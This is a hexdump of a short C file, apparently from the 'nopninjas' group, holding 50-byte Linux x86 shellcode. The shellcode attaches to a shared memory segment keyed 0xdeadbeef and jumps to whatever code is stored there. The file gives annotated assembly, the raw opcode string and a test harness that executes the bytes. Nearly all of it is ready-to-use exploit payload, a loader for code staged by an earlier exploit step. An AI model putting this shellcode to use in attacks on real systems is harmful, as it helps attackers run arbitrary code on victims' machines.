00000000  2f 2a 20 73 6c 6f 74 68  40 6e 6f 70 6e 69 6e 6a  |/* sloth@nopninj|
00000010  61 73 2e 63 6f 6d 20 2d  20 68 74 74 70 3a 2f 2f  |as.com - http://|
00000020  77 77 77 2e 6e 6f 70 6e  69 6e 6a 61 73 2e 63 6f  |www.nopninjas.co|
00000030  6d 0d 0a 0d 0a 20 20 20  50 6c 61 74 66 6f 72 6d  |m....   Platform|
00000040  3a 20 4c 69 6e 75 78 20  78 38 36 0d 0a 20 20 20  |: Linux x86..   |
00000050  4c 65 6e 67 74 68 3a 20  35 30 20 62 79 74 65 73  |Length: 50 bytes|
00000060  0d 0a 20 20 20 20 20 0d  0a 20 20 20 2d 20 54 68  |..     ..   - Th|
00000070  69 73 20 73 68 65 6c 6c  63 6f 64 65 20 63 6f 6e  |is shellcode con|
00000080  6e 65 63 74 73 20 74 6f  20 74 68 65 20 73 68 61  |nects to the sha|
00000090  72 65 64 20 6d 65 6d 6f  72 79 20 73 65 67 6d 65  |red memory segme|
000000a0  6e 74 20 6d 61 74 63 68  69 6e 67 20 74 68 65 20  |nt matching the |
000000b0  6b 65 79 0d 0a 20 20 20  20 20 61 6e 64 20 65 78  |key..     and ex|
000000c0  65 63 75 74 65 73 20 74  68 65 20 63 6f 64 65 20  |ecutes the code |
000000d0  61 74 20 74 68 61 74 20  61 64 64 72 65 73 73 2e  |at that address.|
000000e0  20 0d 0a 0d 0a 20 20 20  20 20 20 20 20 78 6f 72  | ....        xor|
000000f0  6c 20 20 20 20 25 65 64  69 2c 25 65 64 69 0d 0a  |l    %edi,%edi..|
00000100  20 20 20 20 20 20 20 20  78 6f 72 6c 20 20 20 20  |        xorl    |
00000110  25 65 73 69 2c 25 65 73  69 0d 0a 20 20 20 20 20  |%esi,%esi..     |
00000120  20 20 20 78 6f 72 6c 20  20 20 20 25 65 64 78 2c  |   xorl    %edx,|
00000130  25 65 64 78 0d 0a 20 20  20 20 20 20 20 20 6d 6f  |%edx..        mo|
00000140  76 6c 20 20 20 20 24 30  78 64 65 61 64 62 65 65  |vl    $0xdeadbee|
00000150  66 2c 25 65 63 78 20 20  20 20 20 20 20 2a 20 73  |f,%ecx       * s|
00000160  68 61 72 65 64 20 6d 65  6d 6f 72 79 20 6b 65 79  |hared memory key|
00000170  20 2a 0d 0a 20 20 20 20  20 20 20 20 78 6f 72 6c  | *..        xorl|
00000180  20 20 20 20 25 65 62 78  2c 25 65 62 78 0d 0a 20  |    %ebx,%ebx.. |
00000190  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
000001a0  32 33 2c 25 62 6c 0d 0a  20 20 20 20 20 20 20 20  |23,%bl..        |
000001b0  78 6f 72 6c 20 20 20 20  25 65 61 78 2c 25 65 61  |xorl    %eax,%ea|
000001c0  78 0d 0a 20 20 20 20 20  20 20 20 6d 6f 76 62 20  |x..        movb |
000001d0  20 20 20 24 31 31 37 2c  25 61 6c 0d 0a 20 20 20  |   $117,%al..   |
000001e0  20 20 20 20 20 69 6e 74  20 20 20 20 20 24 30 78  |     int     $0x|
000001f0  38 30 0d 0a 0d 0a 20 20  20 20 20 20 20 20 78 6f  |80....        xo|
00000200  72 6c 20 20 20 20 25 65  64 69 2c 25 65 64 69 0d  |rl    %edi,%edi.|
00000210  0a 20 20 20 20 20 20 20  20 6d 6f 76 6c 20 20 20  |.        movl   |
00000220  20 24 30 78 62 66 66 66  66 66 66 61 2c 25 65 73  | $0xbffffffa,%es|
00000230  69 20 20 20 20 20 20 20  2a 20 70 6f 69 6e 74 65  |i       * pointe|
00000240  72 20 73 74 6f 72 61 67  65 20 6c 6f 63 61 74 69  |r storage locati|
00000250  6f 6e 20 2a 0d 0a 20 20  20 20 20 20 20 20 78 6f  |on *..        xo|
00000260  72 6c 20 20 20 20 25 65  64 78 2c 25 65 64 78 0d  |rl    %edx,%edx.|
00000270  0a 20 20 20 20 20 20 20  20 6d 6f 76 6c 20 20 20  |.        movl   |
00000280  20 25 65 61 78 2c 25 65  63 78 0d 0a 20 20 20 20  | %eax,%ecx..    |
00000290  20 20 20 20 78 6f 72 6c  20 20 20 20 25 65 62 78  |    xorl    %ebx|
000002a0  2c 25 65 62 78 0d 0a 20  20 20 20 20 20 20 20 6d  |,%ebx..        m|
000002b0  6f 76 62 20 20 20 20 24  32 31 2c 25 62 6c 0d 0a  |ovb    $21,%bl..|
000002c0  20 20 20 20 20 20 20 20  78 6f 72 6c 20 20 20 20  |        xorl    |
000002d0  25 65 61 78 2c 25 65 61  78 0d 0a 20 20 20 20 20  |%eax,%eax..     |
000002e0  20 20 20 6d 6f 76 62 20  20 20 20 24 31 31 37 2c  |   movb    $117,|
000002f0  25 61 6c 0d 0a 20 20 20  20 20 20 20 20 69 6e 74  |%al..        int|
00000300  20 20 20 20 20 24 30 78  38 30 0d 0a 0d 0a 20 20  |     $0x80....  |
00000310  20 20 20 20 20 20 6d 6f  76 6c 20 20 20 20 24 30  |      movl    $0|
00000320  78 62 66 66 66 66 66 66  61 2c 25 65 61 78 20 20  |xbffffffa,%eax  |
00000330  20 20 20 20 20 2a 20 70  6f 69 6e 74 65 72 20 73  |     * pointer s|
00000340  74 6f 72 61 67 65 20 6c  6f 63 61 74 69 6f 6e 20  |torage location |
00000350  2a 0d 0a 20 20 20 20 20  20 20 20 70 75 73 68 6c  |*..        pushl|
00000360  20 20 20 28 25 65 61 78  29 0d 0a 20 20 20 20 20  |   (%eax)..     |
00000370  20 20 20 72 65 74 0d 0a  0d 0a 2a 2f 0d 0a 0d 0a  |   ret....*/....|
00000380  63 68 61 72 20 73 68 6d  5b 5d 20 3d 20 22 5c 78  |char shm[] = "\x|
00000390  33 31 5c 78 66 66 5c 78  33 31 5c 78 66 36 5c 78  |31\xff\x31\xf6\x|
000003a0  33 31 5c 78 64 32 5c 78  62 39 5c 78 65 66 5c 78  |31\xd2\xb9\xef\x|
000003b0  62 65 5c 78 61 64 5c 78  64 65 5c 78 33 31 5c 78  |be\xad\xde\x31\x|
000003c0  64 62 5c 78 62 33 5c 78  31 37 5c 78 33 31 22 0d  |db\xb3\x17\x31".|
000003d0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |.             "\|
000003e0  78 63 30 5c 78 62 30 5c  78 37 35 5c 78 63 64 5c  |xc0\xb0\x75\xcd\|
000003f0  78 38 30 5c 78 33 31 5c  78 66 66 5c 78 62 65 5c  |x80\x31\xff\xbe\|
00000400  78 66 61 5c 78 66 66 5c  78 66 66 5c 78 62 66 5c  |xfa\xff\xff\xbf\|
00000410  78 33 31 5c 78 64 32 5c  78 38 39 5c 78 63 31 22  |x31\xd2\x89\xc1"|
00000420  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |..             "|
00000430  5c 78 33 31 5c 78 64 62  5c 78 62 33 5c 78 31 35  |\x31\xdb\xb3\x15|
00000440  5c 78 33 31 5c 78 63 30  5c 78 62 30 5c 78 37 35  |\x31\xc0\xb0\x75|
00000450  5c 78 63 64 5c 78 38 30  5c 78 62 38 5c 78 66 61  |\xcd\x80\xb8\xfa|
00000460  5c 78 66 66 5c 78 66 66  5c 78 62 66 5c 78 66 66  |\xff\xff\xbf\xff|
00000470  22 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |"..             |
00000480  22 5c 78 33 30 5c 78 63  33 22 3b 0d 0a 20 20 20  |"\x30\xc3";..   |
00000490  20 20 20 20 20 20 20 20  20 20 20 0d 0a 69 6e 74  |           ..int|
000004a0  20 6d 61 69 6e 28 29 20  7b 0d 0a 20 20 76 6f 69  | main() {..  voi|
000004b0  64 20 28 2a 73 68 65 6c  6c 29 28 29 20 3d 20 28  |d (*shell)() = (|
000004c0  76 6f 69 64 20 2a 29 26  73 68 6d 3b 0d 0a 20 20  |void *)&shm;..  |
000004d0  73 68 65 6c 6c 28 29 3b  0d 0a 7d                 |shell();..}|
000004db
